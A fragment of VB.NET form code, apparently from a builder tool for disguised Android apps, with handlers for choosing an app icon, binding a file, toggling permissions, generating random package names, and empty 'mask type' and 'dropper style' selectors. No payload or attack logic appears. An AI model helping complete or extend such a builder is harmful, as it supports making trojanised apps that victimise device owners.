    Private Sub Trans_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles Trans.Tick
        If (MyBase.Opacity = 1) Then
            Me.Trans.Enabled = False
        Else
            MyBase.Opacity = MyBase.Opacity + 0.1
        End If
    End Sub

    Private Sub TextBox1_KeyPress(sender As Object, e As KeyPressEventArgs) Handles TextBox1.KeyPress
        If ("+_)(*&^%$#@!~`\|\/*-<>:}{][,.?b=_;'""".Contains(Conversions.ToString(e.KeyChar))) Then
            e.Handled = True
        End If
    End Sub

    Private Sub ThemeButton1_Click(sender As Object, e As EventArgs) Handles ThemeButton1.Click
        Try
            Dim defaultIcon As String = String.Concat(Store.Resources(1), "\Icons\devico\gp.png")
            If Operators.ConditionalCompareObjectEqual(Me.ThemeButton1.Tag, "0", False) Then
                Using ofd As New OpenFileDialog()
                    ofd.Filter = "PNG Image (*.png)|*.png|All files (*.*)|*.*"
                    ofd.Title = "Select App Icon"
                    If ofd.ShowDialog() = DialogResult.OK Then
                        Me.PictureBox1.ImageLocation = ofd.FileName
                        Me.Label1.Tag = ofd.FileName
                        Me.Label1.Text = ofd.FileName
                        Me.ThemeButton1.Text = "Delete"
                        Me.ThemeButton1.Tag = "1"
                    End If
                End Using
            Else
                If File.Exists(defaultIcon) Then
                    Me.PictureBox1.ImageLocation = defaultIcon
                    Me.Label1.Tag = defaultIcon
                End If
                Me.Label1.Text = "default"
                Me.ThemeButton1.Text = "Select icon"
                Me.ThemeButton1.Tag = "0"
            End If
        Catch
        End Try
    End Sub

    Private Sub ThemeButton3_Click(sender As Object, e As EventArgs) Handles ThemeButton3.Click
        Try
            If Operators.ConditionalCompareObjectEqual(Me.ThemeButton3.Tag, "0", False) Then
                Using ofd As New OpenFileDialog()
                    ofd.Filter = "All files (*.*)|*.*"
                    ofd.Title = "Select Bind File"
                    If ofd.ShowDialog() = DialogResult.OK Then
                        Me.Label14.Text = ofd.FileName
                        Me.TextBox8.Enabled = True
                        Me.Label15.Enabled = True
                        Me.TextBox8.Text = Path.GetFileNameWithoutExtension(ofd.FileName)
                        Me.ThemeButton3.Tag = "1"
                        Me.ThemeButton3.Text = "Delete"
                    End If
                End Using
            Else
                Me.Label14.Text = ".."
                Me.TextBox8.Text = ".."
                Me.TextBox8.Enabled = False
                Me.Label15.Enabled = False
                Me.ThemeButton3.Tag = "0"
                Me.ThemeButton3.Text = "Select File"
            End If
        Catch
        End Try
    End Sub

    Private Sub TogglePermissionToggle(ByVal pi As SN.PI)
        If (Not Operators.ConditionalCompareObjectEqual(pi.Tag, "OK", False)) Then
            pi.Tag = "OK"
        Else
            pi.Tag = "-"
        End If
    End Sub

    Private Sub Pi1_Click_1(sender As Object, e As EventArgs) Handles Pi1.Click
        TogglePermissionToggle(Me.Pi1)
    End Sub

    Private Sub Pi2_Click(sender As Object, e As EventArgs) Handles Pi2.Click
        TogglePermissionToggle(Me.Pi2)
    End Sub

    Private Sub Pi3_Click(sender As Object, e As EventArgs) Handles Pi3.Click
        TogglePermissionToggle(Me.Pi3)
    End Sub

    Private Sub Pi4_Click(sender As Object, e As EventArgs) Handles Pi4.Click
        TogglePermissionToggle(Me.Pi4)
    End Sub

    Private Sub Pi5_Click(sender As Object, e As EventArgs) Handles Pi5.Click
        TogglePermissionToggle(Me.Pi5)
    End Sub

    Private Sub Pi6_Click(sender As Object, e As EventArgs) Handles Pi6.Click
        If (Not Operators.ConditionalCompareObjectEqual(Me.Pi6.Tag, "OK", False)) Then
            Me.TextBox7.Enabled = True
            Me.Pi6.Tag = "OK"
            If (Operators.CompareString(Me.sGet, Nothing, False) = 0) Then
                Me.TextBox7.Text = ""
            Else
                Me.TextBox7.Text = Me.sGet
            End If
        Else
            Me.TextBox7.Enabled = False
            Me.Pi6.Tag = "-"
            If (Operators.CompareString(Me.TextBox7.Text, "null", False) <> 0) Then
                Me.sGet = Me.TextBox7.Text
            End If
            Me.TextBox7.Text = "null"
        End If
    End Sub

    Private Sub btnGeneratePackage_Click_1(sender As Object, e As EventArgs) Handles btnGeneratePackage.Click
        Me.txtPackageName.Text = GenerateRandomPackageName()
    End Sub

    Private Sub cbMaskType_SelectedIndexChanged(sender As Object, e As EventArgs) Handles cbMaskType.SelectedIndexChanged

    End Sub

    Private Sub PictureBox2_Click(sender As Object, e As EventArgs) Handles PictureBox2.Click

    End Sub

    Private Sub cbDropperStyle_SelectedIndexChanged(sender As Object, e As EventArgs) Handles cbDropperStyle.SelectedIndexChanged

    End Sub
End Class